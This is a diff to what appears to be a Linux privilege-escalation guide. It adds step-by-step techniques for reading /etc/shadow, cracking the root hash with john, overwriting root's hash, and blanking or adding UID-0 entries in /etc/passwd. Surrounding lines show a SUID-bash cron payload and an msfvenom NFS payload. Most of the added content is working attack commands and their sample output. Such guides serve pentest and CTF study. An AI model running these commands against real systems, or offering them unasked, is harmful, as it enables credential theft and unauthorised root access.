@@ -393,6 +393,193 @@ echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /path/to/cron/script
 
 ## File Permissions
 
+If a system file has confidential information we can read, it may be used to gain access to a higher privileged account. If a system file can be written to, we may be able to modify the way it works and gain higher privilege access.
+
+Enumerate all writable files in /etc:
+
+```bash
+find /etc -maxdepth 1 -writable -type f 2>/dev/null
+```
+
+Enumerate all readable files in /etc:
+
+```bash
+find /etc -maxdepth 1 -readable -type f 2>/dev/null
+```
+
+Enumerate all directories which can be written to:
+
+```bash
+find / -executable -writable -type d 2>/dev/null
+```
+
+### /etc/shadow
+
+The `/etc/shadow` file stores user password hashes and is read-only by default for all users except root. We might be able to crack the root user's password hash if we can see the contents of the /etc/shadow file. We can change the root user's password hash with one we know if we can modify the /etc/shadow file.
+
+#### Shadow Privilege Escalation
+
+1. Enumerate the permissions of the `/etc/shadow` file:
+
+   ```text
+   $ ls -l /etc/shadow
+   -rw-r—rw- 1 root shadow 810 May 15 2021 /etc/shadow
+   ```
+
+   > Note that it is world readable.
+
+2. Copy the root user’s password hash:
+
+   ```text
+   $ head -n 1 /etc/shadow
+   root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXv
+   RDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
+   ```
+
+3. Paste the password hash in a file \(e.g. hash.txt\):
+
+   ```text
+   $ echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVl
+   aXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' > hash.txt'
+   ```
+
+4. Crack the password hash using john:
+
+   ```text
+   $ john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.t
+   xt hash.txt
+   ...
+   password123 (?)
+   ```
+
+5. Authenticate with the password cracked:
+
+   ```text
+   $ su
+   Password:
+   root@victim:/# id
+   uid=0(root) gid=0(root) groups=0(root)
+   ```
+
+#### Alternative Shadow Privilege Escalation Method
+
+1. Enumerate the permissions of the /etc/shadow file:
+
+   ```text
+   $ ls -l /etc/shadow
+   -rw-r—rw- 1 root shadow 810 May 15 2021 /etc/shadow
+   ```
+
+   > Note that it is world writable.
+
+2. Back up the contents of /etc/shadow so we can restore it later.
+3. Generate a new SHA-512 password hash with `mkpasswd`:
+
+   ```text
+   $ mkpasswd -m sha-512 newpassword
+   $6$DoH8o2GhA$5A7DHvXfkIQO1Zctb834b.SWIim2NBNys9D9h5wUvYK3IOGdxoOlL9VE
+   WwO/okK3vi1IdVaO9.xt4IQMY4OUj/
+   ```
+
+4. Modify the /etc/shadow and replace the root user’s password hash with the one you generated.
+
+   ```text
+   root:$6$DoH8o2GhA$5A7DHvXfkIQO1Zctb834b.SWIim2NBNys9D9h5wUvYK3IOGdxoO
+   lL9VEWwO/okK3vi1IdVaO9.xt4IQMY4OUj/:17298:0:99999:7:::
+   ```
+
+5. Authenticate with the password cracked:
+
+   ```text
+   $ su
+   Password:
+   root@victim:/# id
+   uid=0(root) gid=0(root) groups=0(root)
+   ```
+
+### /etc/passwd
+
+User password hashes were formerly stored in `/etc/passwd`. If the second field of a user row in contains a password hash, it takes precedence over the hash for backward compatibility. 
+
+If we can only write to the file, we may also create a new user and give them the root user ID \(0\). Because Linux allows several entries for the same user ID as long as the usernames are distinct.
+
+The root account in `/etc/passwd` is usually configured like this:
+
+```text
+root:x:0:0:root:/root:/bin/bash
+```
+
+The “x” in the second field instructs Unix/Linux to search for the password hash in the /etc/shadow file. In some versions of Unix/Linux, it is possible to simply delete the “x”, which is interpreted as the user having no password:
+
+```text
+root::0:0:root:/root:/bin/bash
+```
+
+#### /etc/passwd Privilege Escalation
+
+1. Enumerate the permissions of the /etc/passwd file:
+
+   ```text
+   $ ls -l /etc/passwd
+   -rw-r--rw- 1 root root 951 May 15 2021 /etc/passwd
+   ```
+
+   > Note that it is world writable.
+
+2. Generate a password hash for the password “password” with `openssl`:
+
+   ```text
+   $ openssl passwd "password"
+   L9yLGxncbOROc
+   ```
+
+3. Modify the `/etc/passwd` file and paste the hash in the second field of the root user row:
+
+   ```text
+   root:L9yLGxncbOROc:0:0:root:/root:/bin/bash
+   ```
+
+4. Authenticate as the root user:
+
+   ```text
+   $ su
+   Password:
+   # id
+   uid=0(root) gid=0(root) groups=0(root)
+   ```
+
+5. Alternatively, append a new row to the file `/etc/passwd` to create an alternate root user:
+
+   ```text
+   rootuser:L9yLGxncbOROc:0:0:root:/root:/bin/bash
+   ```
+
+6. Switch to the 'rootuser' user:
+
+   ```text
+   $ su rootuser
+   Password:
+   # id
+   uid=0(root) gid=0(root) groups=0(root)
+   ```
+
+### Backups
+
+If a machine's permissions on crucial or sensitive files are how they should be, sometimes we may find a user's backups of these files, and maybe there are stored insecurely.
+
+#### Backups Privilege Escalation
+
+1. Enumerate for interesting files, especially hidden files or directories:
+
+   ```text
+   $ ls -la /home/username
+   $ ls -la /
+   $ ls -la /tmp
+   $ ls -la /var/backups
+   ```
+
+2. You may find credentials, keys, programs, or something interesting/odd.
+
 ## Service Exploits
 
 Exploiting vulnerable services that are executing as root can result in command execution as root.
@@ -812,7 +999,7 @@ Root squashing is disabled via the no\_root\_squash NFS configuration option. A 
    mount -o rw,vers=2 192.168.10.10:/tmp /tmp/nfs
    ```
 
-4. Create a payload and store it to the mounted share as the root user on your local host \(e.g Kali or Parrot\):
+4. Create a payload and store it to the mounted share as the root user on your localhost \(e.g Kali or Parrot\):
 
    ```text
    msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
